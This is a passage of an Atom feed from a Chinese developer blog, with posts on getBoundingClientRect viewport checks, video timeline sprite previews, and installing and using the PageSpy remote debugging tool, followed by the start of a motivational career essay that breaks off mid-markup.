    <id>http://damao2250.com/2024/11/28/getBoundingClientRect-%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE/</id>
    <published>2024-11-28T03:03:04.000Z</published>
    <updated>2025-05-09T04:12:57.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="getBoundingClientRect"><a href="#getBoundingClientRect" class="headerlink" title="getBoundingClientRect()"></a>getBoundingClientRect()</h2><ul><li>用于获取元素的位置以及大小相关的信息</li><li>DOM 元素的一个方法，返回一个 DOMRect 对象，包含元素的大小及其相对于视口的位置</li></ul><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js">element<span class="token punctuation">.</span>getBoundingClientRect（）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><ul><li>有 6 个属性：top，<code>lef</code>，<code>right</code>，<code>bottom</code>，<code>width</code>，<code>height</code></li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  bottom：<span class="token number">353</span><span class="token punctuation">,</span>   <span class="token comment">//元素底部距离窗口顶部的距离 (等于 y + height)</span>  height<span class="token operator">:</span> <span class="token number">24</span><span class="token punctuation">,</span>    <span class="token comment">//元素的高度</span>  left<span class="token operator">:</span> <span class="token number">428</span><span class="token punctuation">,</span>     <span class="token comment">//元素左侧距离窗口左侧的距离</span>  right<span class="token operator">:</span> <span class="token number">1140</span><span class="token punctuation">,</span>   <span class="token comment">//元素右侧距离窗口左侧的距离(等于 x + width)</span>  top<span class="token operator">:</span> <span class="token number">329</span><span class="token punctuation">,</span>      <span class="token comment">//元素顶部距离窗口的距离</span>  width<span class="token operator">:</span> <span class="token number">712</span><span class="token punctuation">,</span>    <span class="token comment">//元素的宽度</span>  x<span class="token operator">:</span> <span class="token number">428</span><span class="token punctuation">,</span>        <span class="token comment">//元素左上角相对于视口的横坐标</span>  y<span class="token operator">:</span> <span class="token number">329</span>         <span class="token comment">//元素左上角相对于视口的纵坐标</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="应用：检查元素是否在视口内"><a href="#应用：检查元素是否在视口内" class="headerlink" title="应用：检查元素是否在视口内"></a>应用：检查元素是否在视口内</h2><ul><li>获取元素位置</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> <span class="token function-variable function">isElementVisible</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">el</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> rect <span class="token operator">=</span> el<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>获取浏览器窗口的宽高</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> <span class="token function-variable function">isElementVisible</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">el</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> rect <span class="token operator">=</span> el<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> vWidth <span class="token operator">=</span> window<span class="token punctuation">.</span>innerWidth <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth  <span class="token keyword">const</span> vHeight <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>确认元素是否在视口内条件</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// rect.right &lt; 0 ||</span><span class="token comment">// rect.bottom &lt; 0 ||</span><span class="token comment">// rect.left > vWidth ||</span><span class="token comment">// rect.top > vHeight</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/getBoundingClientRect-%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="getBoundingClientRect-示意图"></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> <span class="token function-variable function">isElementVisible</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">el</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> rect <span class="token operator">=</span> el<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> vWidth <span class="token operator">=</span> window<span class="token punctuation">.</span>innerWidth <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth  <span class="token keyword">const</span> vHeight <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight  <span class="token keyword">if</span> <span class="token punctuation">(</span>    rect<span class="token punctuation">.</span>right <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>    rect<span class="token punctuation">.</span>bottom <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>    rect<span class="token punctuation">.</span>left <span class="token operator">></span> vWidth <span class="token operator">||</span>    rect<span class="token punctuation">.</span>top <span class="token operator">></span> vHeight  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token comment">// getBoundingClientRect 方法会使浏览器发生回流和重绘，性能消耗稍大，但兼容性比 Intersection Observer 要好</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>Intersection Observer 方案</p><ul><li>Intersection Observer API 提供了一种异步检测目标元素与祖先元素或 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Viewport">viewport</a> 相交情况变化的方法。在目标元素与视口或者其他指定元素发生交集时和触发配置的回调函数。</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 获取要监测的元素</span><span class="token keyword">const</span> boxes <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">".box"</span><span class="token punctuation">)</span><span class="token comment">// 创建观察者，配置回调函数</span><span class="token comment">// 通过 isIntersecting 属性判断元素与视口是否相交</span><span class="token keyword">const</span> observer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">entries<span class="token punctuation">,</span> observer</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  entries<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">entry</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span>target<span class="token punctuation">,</span> entry<span class="token punctuation">.</span>isIntersecting <span class="token operator">?</span> <span class="token string">"visible"</span> <span class="token operator">:</span> <span class="token string">"invisible"</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>boxes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">box</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  observer<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>box<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;getBoundingClientRect&quot;&gt;&lt;a href=&quot;#getBoundingClientRect&quot; class=&quot;headerlink&quot; title=&quot;getBoundingClientRect()&quot;&gt;&lt;/a&gt;getBoundingClientRect</summary>
      
    
    
    
    <category term="HTML" scheme="http://damao2250.com/categories/HTML/"/>
    
    
    <category term="元素位置" scheme="http://damao2250.com/tags/%E5%85%83%E7%B4%A0%E4%BD%8D%E7%BD%AE/"/>
    
    <category term="getBoundingClientRect" scheme="http://damao2250.com/tags/getBoundingClientRect/"/>
    
  </entry>
  
  <entry>
    <title>Web端视频时间轴预览图思路</title>
    <link href="http://damao2250.com/2024/11/25/Web%E7%AB%AF%E8%A7%86%E9%A2%91%E6%97%B6%E9%97%B4%E8%BD%B4%E9%A2%84%E8%A7%88%E5%9B%BE%E6%80%9D%E8%B7%AF/"/>
    <id>http://damao2250.com/2024/11/25/Web%E7%AB%AF%E8%A7%86%E9%A2%91%E6%97%B6%E9%97%B4%E8%BD%B4%E9%A2%84%E8%A7%88%E5%9B%BE%E6%80%9D%E8%B7%AF/</id>
    <published>2024-11-25T08:36:33.000Z</published>
    <updated>2025-05-09T04:06:36.963Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Web端视频时间轴预览图思路"><a href="#Web端视频时间轴预览图思路" class="headerlink" title="Web端视频时间轴预览图思路"></a>Web端视频时间轴预览图思路</h3><ul><li><p>在鼠标首次移动到时间轴上时，获取到一雪碧图，它包含了鼠标所指位置附近的预览画面。在鼠标沿着时间滑动的时候，会根据判断是否需要请求新的雪碧图</p></li><li><p>接口返回一个数据是让前端拿到视频的预览信息，可以定位到预览图在哪个 URL 的几行几列，后端则负责雪碧图的生成</p></li><li><p>后端可以通过FFmpeg抽取关键帧</p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.dreamfever.me/posts/2024-07-07-ffmpeg-sprite-sheet/">https://blog.dreamfever.me/posts/2024-07-07-ffmpeg-sprite-sheet/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Web端视频时间轴预览图思路&quot;&gt;&lt;a href=&quot;#Web端视频时间轴预览图思路&quot; class=&quot;headerlink&quot; title=&quot;Web端视频时间轴预览图思路&quot;&gt;&lt;/a&gt;Web端视频时间轴预览图思路&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在鼠标首次移动到时间轴上时</summary>
      
    
    
    
    <category term="其他" scheme="http://damao2250.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="其他" scheme="http://damao2250.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>有趣的调试工具PageSpy</title>
    <link href="http://damao2250.com/2024/10/18/%E6%9C%89%E8%B6%A3%E7%9A%84%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7PageSpy/"/>
    <id>http://damao2250.com/2024/10/18/%E6%9C%89%E8%B6%A3%E7%9A%84%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7PageSpy/</id>
    <published>2024-10-18T04:53:08.000Z</published>
    <updated>2025-05-09T04:06:36.968Z</updated>
    
    <content type="html"><![CDATA[<h2 id="贴地址"><a href="#贴地址" class="headerlink" title="贴地址"></a>贴地址</h2><ul><li>PageSpy：<a href="https://pagespy.org/">https://pagespy.org</a></li></ul><h2 id="PageSpy"><a href="#PageSpy" class="headerlink" title="PageSpy"></a>PageSpy</h2><ul><li>PageSpy 是一款兼容 Web / 小程序 / React Native / 鸿蒙 App 等平台项目的开源调试平台。基于对原生 API 的封装，它将调用原生方法时的参数进行过滤、转化，整理成一定格式的消息供调试端消费；调试端收到消息数据后，提供类似本地控制台的功能界面将数据呈现出来。</li></ul><h2 id="现实调试存在问题与PageSpy优势"><a href="#现实调试存在问题与PageSpy优势" class="headerlink" title="现实调试存在问题与PageSpy优势"></a>现实调试存在问题与PageSpy优势</h2><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/why-is-pagespy-zh-a37ee831.png" alt="why-is-pagespy-zh-a37ee831"></p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li><p>日常开发中，项目出现问题基本都会通过 本地浏览器控制台 排查。可有些时候因为无法使用控制台，而导致排查故障需要多花费很多时间和人力，比如：</p><ul><li>真机调试 H5：以往有产品提供了可以在 H5 上查看信息的面板，但真机屏幕太小操作不便、显示不友好，以及数据会被截断；</li><li>远程办公、异地协同：传统沟通方式如邮件、电话、视频等，沟通问题的周期长、效率不高、故障信息不全面，容易误解误判；</li><li>用户设备白屏：除了需要提前获知出现问题的用户信息，定位问题的方式包括查看数据监控、日志分析，甚至还要跑到客户现场等，这些方式依赖排障人员要理解业务场景、技术实现；</li></ul></li><li><p>网站全局的 “问题反馈” 组件</p><ul><li>大多注重用户体验的网站，会在产品端为用户提供反馈问题的表单组件。从用户的角度这确实会提升好感，但用户提交的内容对于排查问题的帮助可能并不大，根本原因是：用户提交的基本上是文字概述和截图，或许还包含用户信息，但开发者更希望看到的是：<ul><li>用户是如何操作的；</li><li>伴随着操作，程序的运行时行为数据。例如：打印的日志、发出的网络请求以及响应数据等；</li></ul></li></ul></li></ul><h2 id="能力"><a href="#能力" class="headerlink" title="能力"></a>能力</h2><h3 id="PageSpy-在线实时调试"><a href="#PageSpy-在线实时调试" class="headerlink" title="PageSpy 在线实时调试"></a>PageSpy 在线实时调试</h3><ul><li>产品联调期间，测试人员上报问题后，开发者通过 「 PageSpy 在线实时调试」 查看程序的运行数据，其中包括实时的 Console 、Network 、Page 、Storage 以及 System 信息，还可以发送代码到真机上执行；</li></ul><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/online-debug.png"></p><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/pagespy-devtools.png"></p><h3 id="PageSpy-日志回放调试"><a href="#PageSpy-日志回放调试" class="headerlink" title="PageSpy 日志回放调试"></a>PageSpy 日志回放调试</h3><ul><li>系统接入 PageSpy 之后，收到类似的反馈只需告诉对方 上传日志 即可</li><li>对方上传完成后就可以前往回放调试，开发者除了可以看到运行时数据外，还可以看到用户的操作轨迹</li></ul><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/replay-debug.png"></p><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/replay-page.gif"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="部署PageSpy服务"><a href="#部署PageSpy服务" class="headerlink" title="部署PageSpy服务"></a>部署PageSpy服务</h3><ul><li>使用 Docker 部署<pre class="line-numbers language-ps" data-language="ps"><code class="language-ps">docker run -d --restart&#x3D;always -v .&#x2F;log:&#x2F;app&#x2F;log -v .&#x2F;data:&#x2F;app&#x2F;data -p 6752:6752 --name&#x3D;&quot;pageSpy&quot; ghcr.io&#x2F;huolalatech&#x2F;page-spy-web:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>使用 Node 部署<pre class="line-numbers language-ps" data-language="ps"><code class="language-ps">yarn global add @huolala-tech&#x2F;page-spy-api@latest &amp;&amp; page-spy-api# 或者npm install -g @huolala-tech&#x2F;page-spy-api@latest &amp;&amp; page-spy-api<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>启动完成后，打开浏览器访问 <a href="http://localhost:6752/">http://localhost:6752</a> 体验</li></ul><h3 id="使用PageSpy"><a href="#使用PageSpy" class="headerlink" title="使用PageSpy"></a>使用PageSpy</h3><ul><li>在客户端的项目中加载 PageSpy:<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- PageSpy SDK --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://&lt;your-pagespy-host>/page-spy/index.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 插件（非必须，但建议使用） --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://&lt;your-pagespy-host>/plugin/data-harbor/index.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://&lt;your-pagespy-host>/plugin/rrweb/index.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>初始化 PageSpy 和插件，它们的初始化参数都提供了可选的 配置项 用于自定义 SDK 的行为：<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  window<span class="token punctuation">.</span>$harbor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataHarborPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  window<span class="token punctuation">.</span>$rrweb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RRWebPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">[</span>window<span class="token punctuation">.</span>$harbor<span class="token punctuation">,</span> window<span class="token punctuation">.</span>$rrweb<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">p</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    PageSpy<span class="token punctuation">.</span><span class="token function">registerPlugin</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  window<span class="token punctuation">.</span>$pageSpy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageSpy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>引入的插件提供了哪些功能？</li><li>DataHarborPlugin 和 RRWebPlugin 两个插件，主要用于拓展 PageSpy 的能力：<ul><li>DataHarborPlugin：PageSpy 本身仅支持在线模式，即调试期间「客户端和调试端必须同时在线」，DataHarborPlugin 让 PageSpy 实现了离线模式的调试。点击 离线日志回放 查看更多详细信息；</li><li>RRWebPlugin：记录用户操作轨迹，底层使用 rrweb。通常和 DataHarborPlugin 绑定在一起使用。</li></ul></li></ul><h3 id="在小程序中使用"><a href="#在小程序中使用" class="headerlink" title="在小程序中使用"></a>在小程序中使用</h3><ul><li>第一步: 在项目中安装依赖。我们提供了几种小程序平台的 SDK，请根据需要安装：<pre class="line-numbers language-ps" data-language="ps"><code class="language-ps"># 微信小程序yarn add @huolala-tech&#x2F;page-spy-wechat@latest# 支付宝小程序yarn add @huolala-tech&#x2F;page-spy-alipay@latest# UniAPPyarn add @huolala-tech&#x2F;page-spy-uniapp@latest# Taroyarn add @huolala-tech&#x2F;page-spy-taro@latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>第二步: 将 PageSpy 服务域名填入小程序的 http、websocket 请求白名单中。注意除了开发环境，小程序强制要求使用 https 和 wss 协议：<pre class="line-numbers language-ps" data-language="ps"><code class="language-ps">https:&#x2F;&#x2F;&lt;your-pagespy-host&gt;wss:&#x2F;&#x2F;&lt;your-pagespy-host&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>第三步: 在入口文件中引入 SDK 并实例化，初始化参数提供了可选的 配置项 用于自定义 SDK 的行为：<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">import</span> PageSpy <span class="token keyword">from</span> <span class="token string">'@huolala-tech/page-spy-wechat'</span><span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token class-name">PageSpy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token operator">:</span> <span class="token string">"&lt;your-pagespy-host>"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="在框架中集成"><a href="#在框架中集成" class="headerlink" title="在框架中集成"></a>在框架中集成</h3><ul><li>React：CodeSandbox - <a href="https://codesandbox.io/p/sandbox/page-spy-with-react-k3pzzt">PageSpy in React</a></li><li>Vue：CodeSandbox - <a href="https://codesandbox.io/p/sandbox/page-spy-with-vue-ft35qs">PageSpy in Vue</a></li><li>Svelte：CodeSandbox - <a href="https://codesandbox.io/p/sandbox/page-spy-with-svelte-p6mxd6">PageSpy in Svelte</a></li><li>Angular：CodeSandbox - <a href="https://codesandbox.io/p/sandbox/page-spy-with-angular-6wg3ps">PageSpy in Angular</a></li><li>Nextjs：CodeSandbox - <a href="https://codesandbox.io/p/sandbox/page-spy-with-nextjs-5htxv5">PageSpy in Nextjs</a></li><li>Nuxtjs：CodeSandbox - <a href="https://codesandbox.io/p/sandbox/page-spy-with-nuxtjs-8znq22">PageSpy in Nuxtjs</a></li></ul><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="PageSpy-1"><a href="#PageSpy-1" class="headerlink" title="PageSpy"></a>PageSpy</h3><ul><li>约定实例变量名称为 $pageSpy = new PageSpy(…)；<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>$pageSpy<span class="token punctuation">.</span><span class="token function">updateRoomInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>$pageSpy<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>PageSpy<span class="token punctuation">.</span><span class="token function">registerPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>PageSpy<span class="token punctuation">.</span>pluginsWithOrder$pageSpy<span class="token punctuation">.</span>version$pageSpy<span class="token punctuation">.</span>config$pageSpy<span class="token punctuation">.</span>socketStore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3></li><li>DataHarborPlugin</li><li>约定实例变量名称为 $harbor = new DataHarborPlugin(…)；<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>$harbor<span class="token punctuation">.</span><span class="token function">onOfflineLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="RRWebPlugin"><a href="#RRWebPlugin" class="headerlink" title="RRWebPlugin"></a>RRWebPlugin</h3></li><li>约定实例变量名称为 $rrweb = new RRWebPlugin(…)；<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="API参考地址"><a href="#API参考地址" class="headerlink" title="API参考地址"></a>API参考地址</h3></li><li><a href="https://www.pagespy.org/#/docs/api">https://www.pagespy.org/#/docs/api</a></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.v2ex.com/t/107906">https://www.v2ex.com/t/107906</a></li><li><a href="https://www.pagespy.org/">https://www.pagespy.org</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;贴地址&quot;&gt;&lt;a href=&quot;#贴地址&quot; class=&quot;headerlink&quot; title=&quot;贴地址&quot;&gt;&lt;/a&gt;贴地址&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;PageSpy：&lt;a href=&quot;https://pagespy.org/&quot;&gt;https://pagespy.org&lt;/</summary>
      
    
    
    
    <category term="调试工具" scheme="http://damao2250.com/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="PageSpy" scheme="http://damao2250.com/tags/PageSpy/"/>
    
  </entry>
  
  <entry>
    <title>窄门大道</title>
    <link href="http://damao2250.com/2024/10/14/%E7%AA%84%E9%97%A8%E5%A4%A7%E9%81%93/"/>
    <id>http://damao2250.com/2024/10/14/%E7%AA%84%E9%97%A8%E5%A4%A7%E9%81%93/</id>
    <published>2024-10-14T06:44:27.000Z</published>
    <updated>2025-05-09T04:09:12.297Z</updated>
    
    <content type="html"><![CDATA[<h3 id="我们需要的是一份水涨船高的事业"><a href="#我们需要的是一份水涨船高的事业" class="headerlink" title="我们需要的是一份水涨船高的事业"></a>我们需要的是一份水涨船高的事业</h3><p>工作❌  事业✅</p><p>我们需要的并不是一份工作</p><p>而是一份水涨船高的事业</p><p>我们没有选择</p><p>因为随着年龄的增长</p><p>人生的风险是指数增加的</p><p>而不是线性增加的</p><p>走了一个越来越陡峭的线</p><p>增加的速度会非常快</p><p>越到后面你会发现麻绳越来越细</p><p>可能还断了 越断越多 越断越快</p><p>这就是指数增长的风险</p><p>但工资是怎么样的呢</p><p>工资是线性增长的</p><p>这还是在特别理想的情况下</p><p>通常是常数，也就是不变</p><p>可能三年也可能五年都不变</p><p>不但不变，搞不好在当下这个环境还降了</p><p>这种事情你听过吗</p><p>以前是从来没有听过这种事情的</p><p>至少在我们的成长经历中是没有经历过的</p><p>这种线性的增加速度怎么赶得上指数增加速度</p><p>我们没有选择</p><p>我们需要的是一份水涨船高的事业</p><p>我们要去哪里</p><p>我们当然要去更高远处</p><p>但是首先知道在哪里</p><p>然后怎么去</p><h3 id="这世界是一款叫生的游戏"><a href="#这世界是一款叫生的游戏" class="headerlink" title="这世界是一款叫生的游戏"></a>这世界是一款叫生的游戏</h3><p>这世界是一款游戏：生</p><p>一个游戏它越是高级越是复杂越是牛</p><p>它的规则就越是简单</p><p>比如像我们这款游戏</p><p>生有两个规则</p><p>第一个：要长久</p><p>第二个：要繁荣</p><p>这两条规则是一切的根本大法</p><p>符合这两条游戏规则的就可以继续玩</p><p>不符合那就没戏</p><h3 id="三追求"><a href="#三追求" class="headerlink" 